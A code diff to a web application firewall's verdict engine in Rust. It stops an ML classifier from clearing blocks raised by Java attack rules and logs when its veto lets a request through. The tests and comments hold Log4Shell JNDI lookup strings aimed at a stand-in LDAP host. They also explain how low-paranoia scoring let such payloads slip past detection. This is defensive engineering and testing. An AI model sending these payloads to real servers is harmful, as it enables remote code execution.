@@ -5563,10 +5563,11 @@ fn fused_score(ctx: &RequestContext, f: &FusionConfig) -> u32 {
 /// sophisticated verdict engine should do — and it is the same silently-inert
 /// shape as a feature that is configured, reported, and never consulted.
 ///
-/// The three conditions are unchanged:
+/// The three conditions:
 ///
-/// 1. No in-house coverage signature (99002xx) fired. Those are ours, tuned
-///    against this corpus, and are not second-guessed.
+/// 1. No rule fired that the classifier cannot judge (`classifier_cannot_judge`):
+///    our in-house coverage signatures (99002xx), and OWASP CRS's Java attack
+///    rules (944xxx), Log4Shell among them.
 /// 2. The rule evidence is thin — under 20, i.e. two or three CRS matches.
 ///    This deliberately reads `anomaly_score`, the RAW rule score, in both
 ///    paths: "how much did the rules actually see" is the same question
@@ -5582,9 +5583,38 @@ fn ml_vetoes_weak_block(ctx: &RequestContext) -> bool {
         && !ctx
             .rule_matches
             .iter()
-            .any(|m| m.rule_id.starts_with("99002"))
+            .any(|m| classifier_cannot_judge(&m.rule_id))
         && ctx.ml_scores.get("payload_attack").copied().unwrap_or(1.0) < ML_SUPPRESSION_MAX
         && request_evidence(ctx) < 20
+}
+
+/// Rules whose blocks the classifier may not clear, because its "looks benign"
+/// would be an absence of knowledge rather than a judgement.
+///
+/// - 99002xx: our own coverage signatures, tuned against this corpus.
+/// - 944xxx: CRS's Java attack rules (Log4Shell, deserialization, class
+///   loading). The classifier's attack corpora contain no Java payload at all,
+///   so it scores `${jndi:ldap://…}` 0.49: no opinion, just under the 0.5 veto
+///   cut-off. At paranoia level 1 a Log4Shell string matches 932130 and 944150
+///   for exactly the block threshold of 10, and the veto cleared it: on
+///   open-appsec's dataset Log4Shell detection fell from 82.7% at level 2 to
+///   25.5% at level 1, plain `${jndi:ldap://…}` included. At level 2 a third
+///   rule usually lifted the evidence past the veto's cap, which hid this.
+fn classifier_cannot_judge(rule_id: &str) -> bool {
+    rule_id.starts_with("99002") || rule_id.starts_with("944")
+}
+
+/// TX variable holding the classifier's payload score when its veto cleared a
+/// block the rules had reached. The event message reads it: without it the log
+/// said "score 10 against this site's threshold of 10 (threshold reached)" on a
+/// request that was let through, and nothing said why — the Log4Shell loss
+/// above was invisible in the WAF's own log.
+const ML_VETO_TX: &str = "ml_veto_payload_score";
+
+fn record_ml_veto(ctx: &mut RequestContext) {
+    let p = ctx.ml_scores.get("payload_attack").copied().unwrap_or(0.0);
+    ctx.tx_vars
+        .insert(ML_VETO_TX.to_string(), format!("{p:.2}"));
 }
 
 /// Anomaly score earned by THIS request — rules, classifier, plugins — with the
@@ -5846,6 +5876,9 @@ fn apply_verdict(ctx: &mut RequestContext, waf: &WafConfig) {
             // path. Without this, turning fusion on disabled FP suppression
             // entirely.
             let vetoed = ml_vetoes_weak_block(ctx);
+            if score > 0 && score >= block_t && vetoed {
+                record_ml_veto(ctx);
+            }
             if score > 0 && score >= block_t && !vetoed {
                 ctx.decision = WafDecision::Block;
                 ctx.block_reason = Some(format!(
@@ -5866,15 +5899,11 @@ fn apply_verdict(ctx: &mut RequestContext, waf: &WafConfig) {
         }
         None => {
             if ctx.anomaly_score > 0 && ctx.anomaly_score >= threshold {
-                // ML suppression: when the n-gram classifier is loaded and
-                // scores the payload as benign (< 0.15), suppress CRS-only
-                // blocks. The ML model acts as a precision layer — if it
-                // doesn't see an attack, a CRS-only match is likely a false
-                // positive on benign prose. Only suppress when:
-                // 1. No coverage rule (99002xx) fired
-                // 2. Anomaly score is moderate (< 20, i.e. 2-3 rules)
-                // 3. ML score is low (< 0.15)
-                if !ml_vetoes_weak_block(ctx) {
+                // The classifier may clear a weak block it judges benign; see
+                // ml_vetoes_weak_block for the three conditions.
+                if ml_vetoes_weak_block(ctx) {
+                    record_ml_veto(ctx);
+                } else {
                     ctx.decision = WafDecision::Block;
                     ctx.block_reason = Some(format!(
                         "anomaly score {} >= threshold {}",
@@ -11920,12 +11949,16 @@ fn explain_event_at(
     if score > 0 {
         match threshold {
             Some(t) => {
+                let vetoed = ctx.tx_vars.get(ML_VETO_TX).filter(|_| !outbound);
                 why = format!(
                     " {score_words} {score} against {threshold_words} {t}{}.",
-                    if score >= t {
-                        " (threshold reached)"
-                    } else {
-                        " (below threshold)"
+                    match (score >= t, vetoed) {
+                        (true, Some(p)) => format!(
+                            " (threshold reached, but the ML classifier scored the payload {p} \
+                             and cleared the block as a likely false positive)"
+                        ),
+                        (true, None) => " (threshold reached)".to_string(),
+                        (false, _) => " (below threshold)".to_string(),
                     }
                 );
             }
@@ -12859,6 +12892,53 @@ mod fusion_tests {
         });
         apply_verdict(&mut c, &mk());
         assert_eq!(c.decision, WafDecision::Block, "in-house signature fired");
+    }
+
+    fn rule_match(id: &str, matched: &str) -> sentinel_core::context::RuleMatch {
+        sentinel_core::context::RuleMatch {
+            rule_id: id.into(),
+            message: "rule".into(),
+            severity: sentinel_core::context::Severity::Critical,
+            score: 5,
+            target: "ARGS:p".into(),
+            phase: Phase::RequestHeaders,
+            matched_value: matched.into(),
+        }
+    }
+
+    /// A Log4Shell string at paranoia level 1 matches 932130 and 944150 for
+    /// exactly the threshold, and the classifier, trained on no Java payload,
+    /// scores it 0.49. Its veto cleared those blocks: on open-appsec's dataset
+    /// Log4Shell detection fell from 82.7% to 25.5%. A Java-rule match now
+    /// stands on both verdict paths, while the same evidence without it is
+    /// still vetoed — and the veto is recorded for the event message.
+    #[test]
+    fn the_classifier_cannot_clear_a_java_attack_rule_block() {
+        let paths = [
+            waf(1, 10, None),
+            waf(1, 10, Some(fusion(true, &[], vec![10, 8, 6, 4], vec![]))),
+        ];
+        for w in &paths {
+            let log4shell = |c: &mut RequestContext| {
+                c.add_engine_score("rules", 10);
+                c.ml_scores.insert("payload_attack".to_string(), 0.49);
+                c.rule_matches
+                    .push(rule_match("932130", "${jndi:ldap://x.example/a}"));
+            };
+
+            let mut c = ctx();
+            log4shell(&mut c);
+            c.rule_matches.push(rule_match("944150", "${jndi"));
+            apply_verdict(&mut c, w);
+            assert_eq!(c.decision, WafDecision::Block, "Log4Shell vetoed");
+            assert!(!c.tx_vars.contains_key(ML_VETO_TX));
+
+            let mut c = ctx();
+            log4shell(&mut c);
+            apply_verdict(&mut c, w);
+            assert_eq!(c.decision, WafDecision::Allow, "no Java rule: veto applies");
+            assert_eq!(c.tx_vars.get(ML_VETO_TX).map(String::as_str), Some("0.49"));
+        }
     }
 
     /// The live reproduction, as a test. A benign search term earning 15 from
@@ -14691,6 +14771,26 @@ mod log_explain_tests {
         // The remediation must name the exact rule AND target to exclude.
         assert!(rem.contains("exclude rule 942100"), "got: {rem}");
         assert!(rem.contains("parameter 'username'"), "got: {rem}");
+    }
+
+    /// A request the rules scored at the threshold and the classifier's veto let
+    /// through used to read "(threshold reached)" on an allowed request, with
+    /// nothing saying why. The veto must be named, with the score it acted on.
+    #[test]
+    fn an_allowed_request_at_the_threshold_names_the_ml_veto() {
+        let mut ctx = ctx_with("45.155.205.233", "/login");
+        ctx.anomaly_score = 10;
+        ctx.rule_matches.push(sqli_match());
+        ctx.tx_vars
+            .insert(ML_VETO_TX.to_string(), "0.12".to_string());
+
+        let (msg, _) = explain_event(&ctx, "PASS", "942100", "SQL injection detected");
+
+        assert!(msg.starts_with("Allowed on 'juice'"), "got: {msg}");
+        assert!(
+            msg.contains("threshold reached, but the ML classifier scored the payload 0.12 and cleared the block"),
+            "got: {msg}"
+        );
     }
 
     /// The most dangerous ambiguity in a WAF log: a learning-mode record that
